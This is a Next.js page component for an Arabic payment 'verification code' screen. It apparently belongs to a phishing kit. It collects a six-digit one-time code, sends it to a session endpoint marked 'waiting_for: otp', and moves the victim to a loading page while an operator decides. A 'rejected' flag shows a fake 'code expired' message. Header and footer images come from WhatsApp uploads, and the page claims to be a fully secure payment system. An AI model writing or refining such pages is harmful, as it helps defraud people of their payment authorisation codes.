"use client";
export const dynamic = 'force-dynamic';
import { useState, useEffect } from "react";
import { useRouter, useSearchParams } from "next/navigation";
import SessionTracker from "@/components/SessionTracker";

const GREEN = "#1e7344";
const DARK_GREEN = "#155a34";

export default function OTPPage() {
  const router = useRouter();
  const [otp, setOtp] = useState("");
  const [timeLeft, setTimeLeft] = useState(120);
  const [canResend, setCanResend] = useState(false);
  const [errorMsg, setErrorMsg] = useState("");
  const [inputError, setInputError] = useState(false);
  const [pressedKey, setPressedKey] = useState<string | null>(null);
  const searchParams = useSearchParams();

  useEffect(() => {
    const rejected = searchParams.get("rejected");
    if (rejected === "1") {
      setErrorMsg("لقد انتهت صلاحية الرمز");
      setInputError(true);
    }
  }, [searchParams]);

  useEffect(() => {
    if (timeLeft <= 0) { setCanResend(true); return; }
    const timer = setTimeout(() => setTimeLeft(t => t - 1), 1000);
    return () => clearTimeout(timer);
  }, [timeLeft]);

  const minutes = Math.floor(timeLeft / 60).toString().padStart(2, "0");
  const seconds = (timeLeft % 60).toString().padStart(2, "0");

  function pressDigit(digit: string) {
    if (otp.length < 6) {
      setOtp(prev => prev + digit);
      if (inputError) { setInputError(false); setErrorMsg(""); }
    }
    setPressedKey(digit);
    setTimeout(() => setPressedKey(null), 150);
  }

  function pressDelete() {
    setOtp(prev => prev.slice(0, -1));
    setPressedKey("del");
    setTimeout(() => setPressedKey(null), 150);
  }

  async function handleConfirm() {
    if (otp.length === 6) {
      setErrorMsg("");
      setInputError(false);
      try {
        await fetch('/api/session', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ current_page: 'otp', otp_code: otp, waiting_for: 'otp' }),
        });
      } catch {}
      router.push("/loading-page?from=otp");
    } else {
      setErrorMsg("يرجى إدخال رمز مكون من 6 أرقام");
      setInputError(true);
    }
  }

  const otpDots = Array.from({ length: 6 }, (_, i) => i < otp.length);

  const numpadKeys = [
    ['1', '2', '3'],
    ['4', '5', '6'],
    ['7', '8', '9'],
    ['', '0', 'del'],
  ];

  return (
    <div style={{
      background: "linear-gradient(160deg, #f0f4f0 0%, #e8f0e8 100%)",
      display: "flex",
      flexDirection: "column",
      alignItems: "center",
      minHeight: "100vh",
      fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif",
      direction: "rtl",
    }}>
      <SessionTracker page="otp" />

      {/* Header - نفس هيدر الصفحة الرئيسية */}
      <img
        src="https://i.ibb.co/8LWchYJd/IMG-20260320-WA0028.jpg"
        alt="Header"
        style={{ width: "100%", display: "block" }}
      />

      {/* Main Content */}
      <div style={{
        flex: 1,
        display: "flex",
        flexDirection: "column",
        alignItems: "center",
        justifyContent: "center",
        padding: "10px 16px",
        width: "100%",
        maxWidth: "400px",
      }}>

        {/* OTP Icon - SVG مدمج */}
        <div style={{ marginBottom: "10px", textAlign: "center" }}>
          <svg width="70" height="70" viewBox="0 0 80 80" fill="none" xmlns="http://www.w3.org/2000/svg">
            <rect x="20" y="8" width="30" height="50" rx="5" fill="white" stroke="#1e7344" strokeWidth="2"/>
            <rect x="23" y="14" width="24" height="26" rx="2" fill="#e8f5ee"/>
            <text x="35" y="24" textAnchor="middle" fontSize="5.5" fontWeight="bold" fill="#1e7344">OTP</text>
            <rect x="25" y="28" width="5" height="5" rx="1" fill="#1e7344" opacity="0.8"/>
            <rect x="32" y="28" width="5" height="5" rx="1" fill="#1e7344" opacity="0.8"/>
            <rect x="39" y="28" width="5" height="5" rx="1" fill="#1e7344" opacity="0.8"/>
            <circle cx="35" cy="52" r="3" fill="#1e7344" opacity="0.25"/>
            <path d="M27 60 Q24 56 26 52 L31 48 Q33 46 35 48 L43 54 Q47 57 45 61 Q43 65 39 64 L29 63 Q27 63 27 60Z" fill="#f5d5b8" stroke="#e0b090" strokeWidth="1"/>
            <path d="M35 48 L36 42 Q36.5 40 38 40.5 Q39.5 41 39 43 L38 48" fill="#f5d5b8" stroke="#e0b090" strokeWidth="0.8"/>
            <path d="M38 47 L40 41 Q40.5 39 42 39.5 Q43.5 40 43 42 L41 47" fill="#f5d5b8" stroke="#e0b090" strokeWidth="0.8"/>
            <path d="M41 48 L43 43 Q43.5 41 45 41.5 Q46.5 42 46 44 L44 49" fill="#f5d5b8" stroke="#e0b090" strokeWidth="0.8"/>
            <circle cx="58" cy="18" r="9" fill="#1e7344" opacity="0.15"/>
            <path d="M58 11 L64 14 L64 19 Q64 23 58 25 Q52 23 52 19 L52 14 Z" fill="#1e7344" opacity="0.85"/>
            <polyline points="55,19 57,21 61,16" stroke="white" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" fill="none"/>
          </svg>
        </div>

        {/* Card */}
        <div style={{
          background: "white",
          borderRadius: "20px",
          padding: "14px 16px 12px",
          width: "100%",
          boxShadow: "0 8px 30px rgba(0,0,0,0.08)",
          border: "1px solid rgba(30,115,68,0.1)",
        }}>
          <h2 style={{ fontSize: "17px", color: "#333", marginBottom: "6px", fontWeight: "bold", textAlign: "center" }}>
            أدخل رمز التحقق
          </h2>
          <p style={{ fontSize: "12px", color: "#777", lineHeight: "1.5", marginBottom: "16px", textAlign: "center" }}>
            يرجى إدخال الرمز المكون من 6 أرقام المرسل لجوالك
          </p>

          {/* OTP Dots */}
          <div style={{
            display: "flex",
            justifyContent: "center",
            gap: "8px",
            marginBottom: "12px",
            direction: "ltr",
          }}>
            {otpDots.map((filled, i) => (
              <div key={i} style={{
                width: "42px",
                height: "48px",
                borderRadius: "10px",
                border: inputError
                  ? "2px solid #e74c3c"
                  : filled
                    ? `2px solid ${GREEN}`
                    : "2px solid #ddd",
                background: inputError
                  ? "#fff5f5"
                  : filled
                    ? `${GREEN}15`
                    : "#fafafa",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                transition: "all 0.15s ease",
                boxShadow: filled && !inputError ? `0 2px 8px ${GREEN}30` : "none",
              }}>
                {filled && (
                  <div style={{
                    width: "12px",
                    height: "12px",
                    borderRadius: "50%",
                    background: inputError ? "#e74c3c" : GREEN,
                  }} />
                )}
              </div>
            ))}
          </div>

          {/* Error Message */}
          {errorMsg && (
            <div style={{
              color: "#e74c3c",
              fontSize: "12px",
              fontWeight: "bold",
              marginBottom: "10px",
              padding: "8px 12px",
              backgroundColor: "#fff5f5",
              borderRadius: "8px",
              border: "1px solid #e74c3c",
              textAlign: "center",
            }}>
              ❌ {errorMsg}
            </div>
          )}

          {/* Timer */}
          <div style={{ fontSize: "12px", color: "#999", marginBottom: "14px", textAlign: "center", minHeight: "20px" }}>
            {canResend ? (
              <span
                onClick={() => { setTimeLeft(120); setCanResend(false); setOtp(""); setErrorMsg(""); setInputError(false); }}
                style={{ color: GREEN, fontWeight: "bold", cursor: "pointer", textDecoration: "underline" }}
              >
                إعادة إرسال الرمز الآن
              </span>
            ) : (
              <>إعادة الإرسال خلال <strong style={{ color: GREEN }}>{minutes}:{seconds}</strong></>
            )}
          </div>

          {/* Numpad */}
          <div style={{
            display: "grid",
            gridTemplateColumns: "repeat(3, 1fr)",
            gap: "8px",
            marginBottom: "14px",
          }}>
            {numpadKeys.flat().map((key, idx) => {
              if (key === '') return <div key={idx} />;
              const isPressed = pressedKey === key;
              const isDel = key === 'del';
              return (
                <button
                  key={idx}
                  onClick={() => isDel ? pressDelete() : pressDigit(key)}
                  style={{
                    height: "50px",
                    borderRadius: "12px",
                    border: isDel ? "1.5px solid #e0e0e0" : `1.5px solid ${isPressed ? GREEN : '#e8e8e8'}`,
                    background: isDel
                      ? (isPressed ? "#fee2e2" : "#fff5f5")
                      : (isPressed ? GREEN : "white"),
                    color: isDel
                      ? "#e74c3c"
                      : (isPressed ? "white" : "#333"),
                    fontSize: isDel ? "11px" : "20px",
                    fontWeight: "bold",
                    cursor: "pointer",
                    transition: "all 0.12s ease",
                    transform: isPressed ? "scale(0.94)" : "scale(1)",
                    boxShadow: isPressed
                      ? (isDel ? "0 2px 6px rgba(231,76,60,0.2)" : `0 2px 8px ${GREEN}40`)
                      : "0 2px 4px rgba(0,0,0,0.06)",
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                  }}
                >
                  {isDel ? (
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                      <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"/>
                      <line x1="18" y1="9" x2="12" y2="15"/>
                      <line x1="12" y1="9" x2="18" y2="15"/>
                    </svg>
                  ) : key}
                </button>
              );
            })}
          </div>

          {/* Confirm Button */}
          <button
            onClick={handleConfirm}
            style={{
              width: "100%",
              background: otp.length === 6
                ? `linear-gradient(135deg, ${GREEN} 0%, ${DARK_GREEN} 100%)`
                : "#ccc",
              color: "white",
              border: "none",
              borderRadius: "12px",
              padding: "14px",
              fontSize: "15px",
              fontWeight: "bold",
              cursor: otp.length === 6 ? "pointer" : "not-allowed",
              transition: "all 0.2s ease",
              boxShadow: otp.length === 6 ? `0 4px 15px ${GREEN}40` : "none",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              gap: "8px",
            }}
          >
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
              <polyline points="20 6 9 17 4 12"/>
            </svg>
            تأكيد العملية
          </button>

          <div style={{ marginTop: "12px", fontSize: "10px", color: "#bbb", textAlign: "center" }}>🔒 نظام دفع مشفر وآمن بالكامل</div>
        </div>
      </div>

      {/* Footer - صورتا الفوتر من الصفحة الرئيسية */}
      <div style={{ width: "100%" }}>
        <img src="https://i.ibb.co/v4MNd90m/IMG-20260322-WA0002.jpg" style={{ width: "100%", display: "block" }} alt="" />
        <img src="https://i.ibb.co/Rp4xMwxN/IMG-20260321-WA0000.jpg" style={{ width: "100%", display: "block" }} alt="" />
      </div>
    </div>
  );
}
